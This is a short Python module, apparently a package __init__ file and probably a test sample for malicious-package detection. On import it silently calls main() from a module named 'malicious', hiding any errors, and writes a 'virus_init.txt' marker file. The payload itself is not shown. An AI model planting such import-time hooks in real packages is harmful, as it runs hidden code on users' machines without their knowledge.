import os
import sys
import datetime
import pathlib

from . import malicious


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(SCRIPT_DIR)

try:
    malicious.main()
except Exception as e:
    pass

try:
    pathlib.Path("/temp").mkdir(parents=True, exist_ok=True)
    with open("/temp/virus_init.txt", "w", encoding="utf-8") as buffer:
        buffer.write(f"I was here at {datetime.datetime.now()} ;>")
except Exception as e:
    pass
